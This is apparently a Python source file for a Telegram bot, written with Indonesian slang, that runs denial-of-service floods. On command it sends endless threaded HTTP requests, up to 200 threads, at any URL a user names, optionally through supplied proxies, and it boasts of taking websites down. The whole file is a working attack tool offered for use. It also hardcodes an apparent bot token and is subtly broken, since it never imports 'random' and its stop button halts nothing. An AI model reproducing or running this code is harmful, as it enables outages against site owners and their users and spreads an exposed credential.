import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import time

bot = telebot.TeleBot("8309103033:AAGe8aSeQwsDjECSBp6mlWec6CnQY3DjiR8")  # Ganti dengan token dari BotFather

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("DDoS Menu", callback_data="ddos_menu"))
    markup.add(InlineKeyboardButton("Attack Levels", callback_data="levels"))
    markup.add(InlineKeyboardButton("Add Proxy", callback_data="proxy"))
    markup.add(InlineKeyboardButton("Info & Status", callback_data="info"))
    markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop"))
    bot.send_message(message.chat.id, "WSP bro? Selamat datang di Omega DDoS Bot! Pilih menu buat ngegas:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "ddos_menu":
        bot.send_message(call.message.chat.id, "Masukkan command /ddos <url> buat mulai attack basic!")
    elif call.data == "levels":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Low Power (10 threads)", callback_data="low"))
        markup.add(InlineKeyboardButton("Medium (50 threads)", callback_data="med"))
        markup.add(InlineKeyboardButton("Full Power (200 threads)", callback_data="full"))
        bot.send_message(call.message.chat.id, "Pilih level attack:", reply_markup=markup)
    elif call.data == "proxy":
        bot.send_message(call.message.chat.id, "Kirim list proxy lo pake /proxy <ip:port,ip:port>")
    elif call.data == "info":
        bot.send_message(call.message.chat.id, "Ini bot DDoS ultimate, bro! Bisa bikin website down dalam hitungan menit kalau lo punya power. Versi V13.5.7, based on real shit. Status: Ready to rumble! 🔥")
    elif call.data == "stop":
        bot.send_message(call.message.chat.id, "Attack stopped, bro. Chill dulu.")
    elif call.data in ["low", "med", "full"]:
        bot.send_message(call.message.chat.id, f"Pilih level {call.data}, masukkan /attack <url> <level>")

proxies = []  # List buat simpen proxies

def ddos_flood(url, num_threads):
    def attack():
        while True:
            try:
                if proxies:
                    proxy = random.choice(proxies)
                    requests.get(url, proxies={"http": proxy, "https": proxy})
                else:
                    requests.get(url)
                time.sleep(0.01)  # Full speed
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

@bot.message_handler(commands=['ddos'])
def ddos_basic(message):
    try:
        url = message.text.split()[1]
        bot.send_message(message.chat.id, f"Starting basic DDoS on {url}! 20 threads incoming! 😈")
        ddos_flood(url, 20)
    except:
        bot.send_message(message.chat.id, "Salah format, bro! /ddos <url>")

@bot.message_handler(commands=['attack'])
def attack_level(message):
    try:
        url = message.text.split()[1]
        level = message.text.split()[2]
        if level == "low":
            threads = 10
        elif level == "med":
            threads = 50
        else:
            threads = 200
        bot.send_message(message.chat.id, f"Full power attack on {url} with {threads} threads! Website gon' down! 🔥")
        ddos_flood(url, threads)
    except:
        bot.send_message(message.chat.id, "Format: /attack <url> <low/med/full>")

@bot.message_handler(commands=['proxy'])
def add_proxy(message):
    try:
        proxy_list = message.text.split()[1].split(',')
        proxies.extend(proxy_list)
        bot.send_message(message.chat.id, f"Added {len(proxy_list)} proxies, bro! Now more powerful! 😎")
    except:
        bot.send_message(message.chat.id, "Format: /proxy <ip:port,ip:port>")

bot.polling()
